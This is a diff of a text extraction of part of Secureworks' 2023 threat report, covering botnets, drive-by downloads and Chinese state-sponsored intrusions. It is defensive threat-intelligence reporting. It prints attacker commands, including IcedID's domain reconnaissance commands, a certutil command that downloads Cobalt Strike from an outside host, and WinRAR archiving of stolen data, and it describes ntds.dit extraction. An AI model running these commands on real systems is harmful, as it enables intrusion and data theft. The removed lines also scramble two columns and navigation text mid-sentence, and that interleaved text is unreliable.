+(Source: Secureworks)
+39
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+BotnetsSome Flourish,
+Others Decline
+The past year saw the continued decline of the large\-scale, long\-
+lived botnets favored by cybercriminals for the past decade and a 
+half. The Conti leaks fallout of March 2022 expedited the downfall of 
+both the TrickBot and Bazar botnets, previously operated by GOLD 
+BLACKBURN. The last year also saw GOLD CRESTWOOD's prolific 
+Emotet botnet, whose association with the Conti ransomware 
+operation was revealed in the Conti leaks, largely sidelined by its 
+operators for unknown reasons, despite several signals that they 
+intended to return it to its former prevalence. For example, in 
+October GOLD CRESTWOOD implemented functionality in their 
+Emotet malware that was likely intended to identify researcher 
+systems and malware sandboxes. However, on November 11, it took 
+a four\-month hiatus, only returning for a brief burst of spamming in 
+March that lasted until early April.
+At the end of August 2023, we also saw the demise of GOLD 
+LAGOONs Qakbot. Thanks to the concerted international law 
+enforcement Operation Duck Hunt36, led by the FBI, the botnet 
+was rendered inoperable. At 23:27 UTC on August 25, we observed 
+the successful takedown through our botnet emulator, detecting 
+the Qakbot botnet distributing shellcode to infected devices. The 
+shellcode unpacked a custom DLL (dynamic link library) executable 
+containing code that cleanly terminates the running Qakbot process 
+on infected hosts. The takedown was conducted in such a way that 
+Qakbot will not run if the host is restarted. 
+At approximately the same time as the DLL began neutralizing 
+infections, CTU researchers observed GOLD LAGOON's backend 
+infrastructure had stopped responding and some infrastructure had 
+been replaced. To interact with infected hosts, the replacement 
+servers required a certificate that can sign messages. Such efforts 
+will make it very hard for GOLD LAGOON to reimplement Qakbot.
+Qakbot posed a significant threat to businesses globally. Engineered 
+for eCrime, Qakbot infections led to the deployment of some of 
+the most sophisticated and damaging ransomware variants. These 
+included Conti, ProLock, Egregor, REvil, MegaCortex, and, more 
+recently, Black Basta, and collectively resulted in losses to businesses 
+in the hundreds of millions of U.S. dollars. The takedown is a 
+welcome intervention.
+By contrast, the IcedID botnet flourished in the past year, having long 
+dispensed with its original purpose of facilitating banking fraud to 
+instead provide initial access to a variety of ransomware\-distributing 
+threat groups. IcedID is used to deliver additional malware which can 
+lead to ransomware deployment; its operator, GOLD SWATHMORE, 
+functions as an initial access broker (IAB), selling access to 
+compromised systems to numerous ransomware operators. In one 
+IcedID infection, which CTU researchers executed in a sandboxed 
+environment simulating a corporate network, the threat actor 
+deployed Cobalt Strike Beacon 21 hours after the initial compromise. 
+IcedID took an unusual hiatus between May 12 and June 7 but has 
+been active during most of the rest of the reporting period.
+40
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+IcedID Communications
+IcedID is distributed as a loader executable that transmits basic 
+system profile information to a first\-stage loader C2 server. This 
+loader C2 server delivers the encrypted core IcedID module to 
+compromised hosts that meet infection criteria as determined 
+by the IcedID backend. The downloaded core IcedID module is 
+decrypted, saved to disk, loaded into memory, and executed. The 
+malware cycles through several hard\-coded C2 servers until it 
+establishes a connection. It then requests available updates, new 
+C2 servers, and additional commands for execution. IcedID is 
+typically instructed to execute several system and network profiling 
+commands shortly after infection. The output of these commands 
+is transmitted to a C2 server. GOLD SWATHMORE and its affiliates 
+use the data to identify high\-value hosts that receive additional 
+commands or malware payloads.
+Figure 17\. System and network profiling commands executed by IcedID shortly after infection. (Source: Secureworks)
+\> net group Domain Admins domain
 \> net view all
 \> net view all domain
 \> nltest domain\_trusts all\_trusts
@@ -166,255 +2413,2062 @@ Others DeclineThe past year saw the continued decline of the large\-scale, long\
 \> ipconfig all 
 \> cmd.exe c chcp \>\&2
 \> WMIC Node:localhost Namespace:rootSecurityCenter2 Path AntiVirusProduct Get
-\> Format:ListFigure 17\. System and network profiling commands executed by IcedID shortly after infection. (Source: Secureworks)2023 State of the Threat: A Year in Review4001Letter From Our VPDespite some functional improvements, such as Qakbot's additionSocGholish lurks on compromised WordPress sites and masqueradesof the ability to capture screenshots on newly infected systems, theas an important software update for web browsers. Potential victims0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?sophistication level of these botnets has stagnated for years. Thisare carefully selected based on their geolocation and the profile ofreflects their new simplified mission of establishing a beachhead ontheir system including its membership within an Active Directorycorporate networks to be quickly used for ransomware delivery. Manynetwork. These factors are used by threat actors to identify high\-botnets have abandoned the so\-called consumer space entirely invalue victims earlier in the kill chain.recent years by refusing to execute malware in any environmentwhere the infected system is not joined with an Active Directorydomain (see figure 18\).Innovations in TTPs Occur04When Infection Chains AreDrive\-by downloads are malicious files unexpectedly deliveredForced to Evolvethrough a web browser, either when the victim was not expecting toDrive\-By Downloadsdownload a file at all, or when the file that they intended to downloadturned out to have been modified to execute malicious code. Thelast six quarters of Secureworks incident response data shows asteady increase in drive\-by downloads as an initial access vector(IAV). CTU researchers have witnessed a surge in the past year indrive\-by downloads used as an initial access vector for ransomwareattacks. Two large\-scale threats delivering these downloads areSocGholish and Gootloader. Both threats convince a potential victiminto downloading a JavaScript file that profiles their local system andcontacts a C2 server for additional malware to execute.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 18\. Malicious SocGholish JavaScript injected into compromised 
-websites. (Source: Secureworks)2023 State of the Threat: A Year in Review4101Letter From Our VPon a vast network of SEO poisoned search phrases, in many casesreported37 to have updated their code. CTU researchers saw itGootloader similarly lurks on compromised WordPress sites and reliesFrom late 2022, the Gootloader operator GOLD ZODIAC was widely0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendixlaw\-themed, to drive victims towards their malware. On numerousdelivering the second stage payload as a PowerShell script earlier inoccasions in 2022, CTU researchers observed Gootloader drive\-bythe year. For example, in one engagement worked by Secureworksdownload compromises resulting in the delivery of Cobalt Strike. Theincident responders, a user downloaded a ZIP file disguised asGootloader code was buried within a large, legitimate but trojanizedsafety information, resulting in Gootloader delivery. Examination ofJavaScript jQuery file. If the infected host was joined to an Activethe victim's logs revealed PowerShell execution before hands\-onDirectory domain, Gootloader attempted to retrieve and execute akeyboard activity involving Cobalt Strike took place.second\-stage script containing a payload such as Cobalt Strike and asmall DLL to load the payload.Gootloader has also reportedly38 been introducing long executiondelays by means of code loops that mean a victimized systemdoes not display artifacts of infection until hours or days after initialcompromise.Figure 19\. Encoded payload written to registry key by Gootloader second\-
-stage script. (Source: Secureworks)Figure 20\. Decoded and formatted PowerShell command from script delivered 
-by Gootloader reflectively loading DLL from registry. (Source: Secureworks)2023 State of the Threat: A Year in Review4205
+\> Format:List
+41
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Despite some functional improvements, such as Qakbot's addition 
+of the ability to capture screenshots on newly infected systems, the 
+sophistication level of these botnets has stagnated for years. This 
+reflects their new simplified mission of establishing a beachhead on 
+corporate networks to be quickly used for ransomware delivery. Many 
+botnets have abandoned the so\-called consumer space entirely in 
+recent years by refusing to execute malware in any environment 
+where the infected system is not joined with an Active Directory 
+domain (see figure 18\).
+Drive\-By Downloads
+Drive\-by downloads are malicious files unexpectedly delivered 
+through a web browser, either when the victim was not expecting to 
+download a file at all, or when the file that they intended to download 
+turned out to have been modified to execute malicious code. The 
+last six quarters of Secureworks incident response data shows a 
+steady increase in drive\-by downloads as an initial access vector 
+(IAV). CTU researchers have witnessed a surge in the past year in 
+drive\-by downloads used as an initial access vector for ransomware 
+attacks. Two large\-scale threats delivering these downloads are 
+SocGholish and Gootloader. Both threats convince a potential victim 
+into downloading a JavaScript file that profiles their local system and 
+contacts a C2 server for additional malware to execute. 
+SocGholish lurks on compromised WordPress sites and masquerades 
+as an important software update for web browsers. Potential victims 
+are carefully selected based on their geolocation and the profile of 
+their system including its membership within an Active Directory 
+network. These factors are used by threat actors to identify high\-
+value victims earlier in the kill chain.
+Figure 18\. Malicious SocGholish JavaScript injected into compromised 
+websites. (Source: Secureworks)
+42
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Gootloader similarly lurks on compromised WordPress sites and relies 
+on a vast network of SEO poisoned search phrases, in many cases 
+law\-themed, to drive victims towards their malware. On numerous 
+occasions in 2022, CTU researchers observed Gootloader drive\-by 
+download compromises resulting in the delivery of Cobalt Strike. The 
+Gootloader code was buried within a large, legitimate but trojanized 
+JavaScript jQuery file. If the infected host was joined to an Active 
+Directory domain, Gootloader attempted to retrieve and execute a 
+second\-stage script containing a payload such as Cobalt Strike and a 
+small DLL to load the payload. 
+From late 2022, the Gootloader operator GOLD ZODIAC was widely 
+reported37 to have updated their code. CTU researchers saw it 
+delivering the second stage payload as a PowerShell script earlier in 
+the year. For example, in one engagement worked by Secureworks 
+incident responders, a user downloaded a ZIP file disguised as 
+safety information, resulting in Gootloader delivery. Examination of 
+the victim's logs revealed PowerShell execution before hands\-on 
+keyboard activity involving Cobalt Strike took place.
+Gootloader has also reportedly38 been introducing long execution 
+delays by means of code loops that mean a victimized system 
+does not display artifacts of infection until hours or days after initial 
+compromise.
+Figure 19\. Encoded payload written to registry key by Gootloader second\-
+stage script. (Source: Secureworks)
+Figure 20\. Decoded and formatted PowerShell command from script delivered 
+by Gootloader reflectively loading DLL from registry. (Source: Secureworks)
+43
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+05
+While many other countries, including India and Pakistan, conduct 
+hostile state\-sponsored cyber activity, CTU researchers primarily 
+focus on China, Russia, Iran, and North Korea as they cause the most 
+impact to our clients. The primary driver of state\-sponsored threat 
+group activity on the part of these countries (and others) continues 
+to be geopolitical considerations. 
+In particular, the war in Ukraine has been the main focus of Russian 
+activity. China too has shifted part of its attention towards Eastern 
+Europe, although Taiwan and China's near neighbors remain a 
+preoccupation. Iran has maintained its focus on dissident activity, 
+its attempts to hinder the progress of the Abraham Accords across 
+Arab neighbors, and on Western intentions towards renegotiations 
+of nuclear accords. As well as cyberespionage, North Korea remains 
+intent on revenue generation, targeting multiple countries to do so.
 State\-Sponsored 
-Threat ActivityWhile many other countries, including India and Pakistan, conducthostile state\-sponsored cyber activity, CTU researchers primarilyfocus on China, Russia, Iran, and North Korea as they cause the mostimpact to our clients. The primary driver of state\-sponsored threatgroup activity on the part of these countries (and others) continuesto be geopolitical considerations.In particular, the war in Ukraine has been the main focus of Russianactivity. China too has shifted part of its attention towards EasternEurope, although Taiwan and China's near neighbors remain apreoccupation. Iran has maintained its focus on dissident activity,its attempts to hinder the progress of the Abraham Accords acrossArab neighbors, and on Western intentions towards renegotiationsof nuclear accords. As well as cyberespionage, North Korea remainsintent on revenue generation, targeting multiple countries to do so.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review4301Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixCHINAA Strategic ThreatMain motivations:EspionageIntellectual PropertyTheft2023 State of the Threat: A Year in Review4401Letter From Our VPCHINA0203Executive Summaryand Key FindingsChinese threat groups are placing a growing emphasis on stealthyCTU researchers have observed Chinese threat actors usingtradecraft to achieve their objectives in cyberespionage attacks. Thecommercial tools such as Cobalt Strike to minimize the risk ofthree pillars of this tradecraft are the use of proxy infrastructure,attribution if they are caught and to blend in with post\-intrusionThe Business of Cybercrimeliving off the land through using native operating system tools, andransomware groups that often use these tools. Some Chinese threatIs Boomtime Back?the ability to adapt their approach as potential target organizationsgroups also appear to adjust tradecraft when returning to a targetincreasingly move to cloud\-based solutions.network after previously being evicted, showing they are adaptableInnovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixChinese Cyberespionage 
+Threat Activity
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Main motivations:EspionageIntellectual PropertyTheft
+CHINA 
+A Strategic Threat
+44
+45
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+CHINA
+Chinese threat groups are placing a growing emphasis on stealthy 
+tradecraft to achieve their objectives in cyberespionage attacks. The 
+three pillars of this tradecraft are the use of proxy infrastructure, 
+living off the land through using native operating system tools, and 
+the ability to adapt their approach as potential target organizations 
+increasingly move to cloud\-based solutions.
+Chinese Cyberespionage 
 Tradecraft Stresses Operational 
-Security and StealthChinese threat groups have in the past had a reputation forsmash\-and\-grab intrusions, where the emphasis was on achievingobjectives on the network as quickly as possible with littleconsideration for detection and attribution. However, a growingnumber of Chinese threat groups have demonstrated an increasingfocus on stealth and operational security in their intrusions andcommand and control (C2\) infrastructure. These tradecraftimprovements have likely been driven in part by a series of high\-profile Department of Justice indictments of Chinese nationalsallegedly involved in cyberespionage activity. Other drivers includepublic exposure by security vendors of this type of activity, and theconsequential likely increased pressure from Chinese leadership toavoid public scrutiny of its cyberespionage activity.and goal\-oriented. On some occasions, they may also focus theirexploitation on non\-Windows devices, where EDR agents may beless likely to be deployed.CTU researchers have increasingly observed Chinese threat groupsdemonstrating careful consideration for operational security over thepast few years including the use of living off the land tools and a C2proxy network built on compromised SOHO routers. This consistentattention to operational security also includes leaving a minimalintrusion footprint and incorporating defense evasion techniques.This focus doesn't just contrast with China's historical reputation,it also demonstrates a heightened level of operational maturity andadherence to a blueprint designed to reduce the likelihood of thedetection and attribution of its intrusion activity.2023 State of the Threat: A Year in Review45Executive Summaryand Key FindingsCTU researchers have seen multiple examples of the ChineseThey used the Cobalt Strike Beacon to execute domain\-widetradecraft described in this section during Secureworks incidentreconnaissance commands including running the net viewresponse engagements. Here are three typical examples:command to list the resources in a network share hosted on a01Letter From Our VPStealth in ActionObservations 
-from IR Engagements0203The Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains Are01During a May 2022 incident response engagement,Secureworks analysts observed a Chinese threat actorcompromise an organization's network with the intent to stealintellectual property. The threat actor primarily used nativeoperating system tools (a technique known as living off theForced to Evolveland) to achieve their objectives, as well as a command\-and\-0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusioncontrol proxy network that included compromised SOHOrouters.The threat actor exploited a vulnerable Pulse Secure deviceas the initial access vector, deployed a variant of the Awenweb shell and the Godzilla web shell to a second server in theenvironment, and then conducted reconnaissance commandssuch as whoami, hostname, and net group. They then used thecertutil command to download a Cobalt Strike Beacon payload(see figure 21\).08Appendixcertutil \-urlcache \-f http:7svFigure 21\. Certutil command to download Cobalt Strike Beacon.
-(Source: Secureworks)server that stores the organization's intellectual property. Thethreat actor used the WinRAR utility to compress files storedwithin this share (see figure 22\)svma \-r.tmp "" \-hpFigure 22\. WinRAR commands to archive data from network share.
-(Source: Secureworks)2023 State of the Threat: A Year in Review4601Letter From Our VP02During an incident response engagement that took place inThis particular intrusion not only reinforces the fundamentalFall 2022, CTU researchers observed a Chinese threat actorneed for network defenders to understand and mitigate risksmoving from a compromised on\-premises network to thebased on changing attack surfaces, but also demonstrates the0203Executive Summaryand Key Findingsorganization's Azure Active Directory (AD) tenant, usingimportance of extensive logging. CTU researchers stronglytechniques that could only be detected via one specificrecommend that organizations collect appropriate AzureMicrosoft log. The threat actor had obtained access to theAD logs to detect unusual activity in their Azure AD tenant,organization's on\-premises network from as early as Summerand audit Azure AD applications for unusual and excessiveThe Business of CybercrimeIs Boomtime Back?2021 after exploiting the ProxyShell vulnerabilities in anpermissions.internet\-facing Microsoft Exchange server. Secureworksincident responders discovered that in Fall 2022 the threatIn this specific case, the only way to observe much of theactor created multiple accounts in the organization's on\-threat actor's activity during the attack was through study ofpremises AD domain and compromised an existing Azure ADthe MailItemsAccessed39 mailbox\-auditing action, which is partadministrator account. The threat actor used the administratorof Microsoft's premium audit functionality. The importanceaccount to add an impersonation role for Microsoft Exchangeof being able to observe MailItemsAccessed events was alsoto an account they had created, and then registered a single\-stressed by CISA as part of an advisory about a June 2023tenant application within the Azure AD tenant and configuredincident in which a state\-sponsored threat actor compromisedthe application to provide access to the organization'sa Microsoft 365 (M365\) cloud environment of a Federal CivilianExchange Online mailboxes (see figure 23\).Executive Branch (FCEB) agency. The advisory stated, CISAand FBI are not aware of other audit logs or events that wouldhave detected this activity.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 23\. Malicious application API permissions in Azure AD portal.
-(Source: Secureworks)2023 State of the Threat: A Year in Review4703One threat group has provided prime examples across multipleSecureworks incident responders observed the threat actorsIR engagements since 2021 of tradecraft designed to evadeusing 7\-Zip to create an archive file containing the SYSTEMdetection and attribution of their intrusion activity and to blendregistry hive and ntds.dit, likely for exfiltration. A few daysin with legitimate network activity: BRONZE SILHOUETTE.later, the threat actors moved laterally to a ManageEngineDuring a Summer 2022 engagement, Secureworks incidentOne command revealed BRONZE SILHOUETTE searching forresponders discovered that BRONZE SILHOUETTE hadone of its C2 IP addresses in the victim's access logs, possiblydeployed a single web shell to multiple servers across thesuggesting a desire to remove evidence of the intrusion.ADSelfService Plus server and ran reconnaissance commands.environment after exploiting an internet\-facing PRTG NetworkMonitor server.A CTU investigation into the attacker\-controlled C2infrastructure revealed at least three Paessler PRTG serversThe threat actor used WMI to execute the native vssadminbelonging to other organizations. This discovery suggests thatcommand on a domain controller to create a volume shadowBRONZE SILHOUETTE targets vulnerable PRTG servers forcopy (see figure 24\). They then extracted the ntds.dit ADinitial access into a target environment and to establish its C2database and the SYSTEM registry hive from the volumeinfrastructure when conducting cyberespionage attacks.shadow copy.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07ConclusionFigure 24\. Threat actor WMI commands to extract the ntds.dit database. 
-(Source: Secureworks)08AppendixFigure 25\. Threat actor commands run under the ManageEngine Java 
-process. (Source: Secureworks)2023 State of the Threat: A Year in Review4801Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixBRONZE PRESIDENT, Watching 
-the War from the SidelinesPrior to 2022, BRONZE PRESIDENT focused its efforts on Asia,mainly Myanmar and Vietnam. However, since Russia's invasion ofUkraine on February 24, 2022, its focus has shifted to obtainingpolitical intelligence surrounding the ongoing war. The threat groupconsistently employs decoy documents that relate to political issuesin the countries surrounding Ukraine, as well as Europe more widely,whilst targeting government officials and various national foreignministries.Since the invasion, CTU researchers observed multiple examplesof BRONZE PRESIDENT's use of PlugX malware to collect relevantinformation. During 2022, the group used malicious shortcut (LNK)files to deliver their malware and continued to use DLL side\-loading.However, techniques varied.For example, analysis of the LNK files used in JuneJuly 2022 andOctober 2022 campaigns showed the LNK file pointing to a copyof the legitimate Adobe Acrobat Distiller executable file, whichwas renamed and used to sideload a highly obfuscated DLL loader.The file imported a highly obfuscated malicious DLL, which thenloaded an encrypted payload file. However, the malware authorchose different (and in each case quite novel) functions to abusefor the shellcode loading, suggesting that the group continuouslyexperiments with different approaches to evasion of host\-basedsecurity agents.Figure 26\. An example of a topically named LNK file (Political Guidance for 
+Security and Stealth
+Chinese threat groups have in the past had a reputation for 
+smash\-and\-grab intrusions, where the emphasis was on achieving 
+objectives on the network as quickly as possible with little 
+consideration for detection and attribution. However, a growing 
+number of Chinese threat groups have demonstrated an increasing 
+focus on stealth and operational security in their intrusions and 
+command and control (C2\) infrastructure. These tradecraft 
+improvements have likely been driven in part by a series of high\-
+profile Department of Justice indictments of Chinese nationals 
+allegedly involved in cyberespionage activity. Other drivers include 
+public exposure by security vendors of this type of activity, and the 
+consequential likely increased pressure from Chinese leadership to 
+avoid public scrutiny of its cyberespionage activity. 
+CTU researchers have observed Chinese threat actors using 
+commercial tools such as Cobalt Strike to minimize the risk of 
+attribution if they are caught and to blend in with post\-intrusion 
+ransomware groups that often use these tools. Some Chinese threat 
+groups also appear to adjust tradecraft when returning to a target 
+network after previously being evicted, showing they are adaptable 
+and goal\-oriented. On some occasions, they may also focus their 
+exploitation on non\-Windows devices, where EDR agents may be 
+less likely to be deployed.
+CTU researchers have increasingly observed Chinese threat groups 
+demonstrating careful consideration for operational security over the 
+past few years including the use of living off the land tools and a C2 
+proxy network built on compromised SOHO routers. This consistent 
+attention to operational security also includes leaving a minimal 
+intrusion footprint and incorporating defense evasion techniques. 
+This focus doesn't just contrast with China's historical reputation, 
+it also demonstrates a heightened level of operational maturity and 
+adherence to a blueprint designed to reduce the likelihood of the 
+detection and attribution of its intrusion activity.
+46
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Stealth in ActionObservations 
+from IR Engagements
+CTU researchers have seen multiple examples of the Chinese 
+tradecraft described in this section during Secureworks incident 
+response engagements. Here are three typical examples:
+During a May 2022 incident response engagement, 
+Secureworks analysts observed a Chinese threat actor 
+compromise an organization's network with the intent to steal 
+intellectual property. The threat actor primarily used native 
+operating system tools (a technique known as living off the 
+land) to achieve their objectives, as well as a command\-and\-
+control proxy network that included compromised SOHO 
+routers.
+The threat actor exploited a vulnerable Pulse Secure device 
+as the initial access vector, deployed a variant of the Awen 
+web shell and the Godzilla web shell to a second server in the 
+environment, and then conducted reconnaissance commands 
+such as whoami, hostname, and net group. They then used the 
+certutil command to download a Cobalt Strike Beacon payload 
+(see figure 21\).
+They used the Cobalt Strike Beacon to execute domain\-wide 
+reconnaissance commands including running the net view 
+command to list the resources in a network share hosted on a 
+server that stores the organization's intellectual property. The 
+threat actor used the WinRAR utility to compress files stored 
+within this share (see figure 22\).
+01
+Figure 21\. Certutil command to download Cobalt Strike Beacon.
+(Source: Secureworks)
+certutil \-urlcache \-f http:7sv
+Figure 22\. WinRAR commands to archive data from network share.
+(Source: Secureworks)
+.svma \-r.tmp "" \-hp
+47
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+This particular intrusion not only reinforces the fundamental 
+need for network defenders to understand and mitigate risks 
+based on changing attack surfaces, but also demonstrates the 
+importance of extensive logging. CTU researchers strongly 
+recommend that organizations collect appropriate Azure 
+AD logs to detect unusual activity in their Azure AD tenant, 
+and audit Azure AD applications for unusual and excessive 
+permissions.
+In this specific case, the only way to observe much of the 
+threat actor's activity during the attack was through study of 
+the MailItemsAccessed39 mailbox\-auditing action, which is part 
+of Microsoft's premium audit functionality. The importance 
+of being able to observe MailItemsAccessed events was also 
+stressed by CISA as part of an advisory about a June 2023 
+incident in which a state\-sponsored threat actor compromised 
+a Microsoft 365 (M365\) cloud environment of a Federal Civilian 
+Executive Branch (FCEB) agency. The advisory stated, CISA 
+and FBI are not aware of other audit logs or events that would 
+have detected this activity.
+During an incident response engagement that took place in 
+Fall 2022, CTU researchers observed a Chinese threat actor 
+moving from a compromised on\-premises network to the 
+organization's Azure Active Directory (AD) tenant, using 
+techniques that could only be detected via one specific 
+Microsoft log. The threat actor had obtained access to the 
+organization's on\-premises network from as early as Summer 
+2021 after exploiting the ProxyShell vulnerabilities in an 
+internet\-facing Microsoft Exchange server. Secureworks 
+incident responders discovered that in Fall 2022 the threat 
+actor created multiple accounts in the organization's on\-
+premises AD domain and compromised an existing Azure AD 
+administrator account. The threat actor used the administrator 
+account to add an impersonation role for Microsoft Exchange 
+to an account they had created, and then registered a single\-
+tenant application within the Azure AD tenant and configured 
+the application to provide access to the organization's 
+Exchange Online mailboxes (see figure 23\). 
+Figure 23\. Malicious application API permissions in Azure AD portal.
+(Source: Secureworks)
+02
+48
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Secureworks incident responders observed the threat actors 
+using 7\-Zip to create an archive file containing the SYSTEM 
+registry hive and ntds.dit, likely for exfiltration. A few days 
+later, the threat actors moved laterally to a ManageEngine 
+ADSelfService Plus server and ran reconnaissance commands. 
+One command revealed BRONZE SILHOUETTE searching for 
+one of its C2 IP addresses in the victim's access logs, possibly 
+suggesting a desire to remove evidence of the intrusion.
+A CTU investigation into the attacker\-controlled C2 
+infrastructure revealed at least three Paessler PRTG servers 
+belonging to other organizations. This discovery suggests that 
+BRONZE SILHOUETTE targets vulnerable PRTG servers for 
+initial access into a target environment and to establish its C2 
+infrastructure when conducting cyberespionage attacks.
+One threat group has provided prime examples across multiple 
+IR engagements since 2021 of tradecraft designed to evade 
+detection and attribution of their intrusion activity and to blend 
+in with legitimate network activity: BRONZE SILHOUETTE.
+During a Summer 2022 engagement, Secureworks incident 
+responders discovered that BRONZE SILHOUETTE had 
+deployed a single web shell to multiple servers across the 
+environment after exploiting an internet\-facing PRTG Network 
+Monitor server.
+The threat actor used WMI to execute the native vssadmin 
+command on a domain controller to create a volume shadow 
+copy (see figure 24\). They then extracted the ntds.dit AD 
+database and the SYSTEM registry hive from the volume 
+shadow copy.
+03
+Figure 25\. Threat actor commands run under the ManageEngine Java 
+process. (Source: Secureworks)
+Figure 24\. Threat actor WMI commands to extract the ntds.dit database. 
+(Source: Secureworks)
+49
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+BRONZE PRESIDENT, Watching 
+the War from the Sidelines
+Prior to 2022, BRONZE PRESIDENT focused its efforts on Asia, 
+mainly Myanmar and Vietnam. However, since Russia's invasion of 
+Ukraine on February 24, 2022, its focus has shifted to obtaining 
+political intelligence surrounding the ongoing war. The threat group 
+consistently employs decoy documents that relate to political issues 
+in the countries surrounding Ukraine, as well as Europe more widely, 
+whilst targeting government officials and various national foreign 
+ministries.
+Since the invasion, CTU researchers observed multiple examples 
+of BRONZE PRESIDENT's use of PlugX malware to collect relevant 
+information. During 2022, the group used malicious shortcut (LNK) 
+files to deliver their malware and continued to use DLL side\-loading. 
+However, techniques varied. 
+For example, analysis of the LNK files used in JuneJuly 2022 and 
+October 2022 campaigns showed the LNK file pointing to a copy 
+of the legitimate Adobe Acrobat Distiller executable file, which 
+was renamed and used to sideload a highly obfuscated DLL loader. 
+The file imported a highly obfuscated malicious DLL, which then 
+loaded an encrypted payload file. However, the malware author 
+chose different (and in each case quite novel) functions to abuse 
+for the shellcode loading, suggesting that the group continuously 
+experiments with different approaches to evasion of host\-based 
+security agents.
+Figure 26\. An example of a topically named LNK file (Political Guidance for 
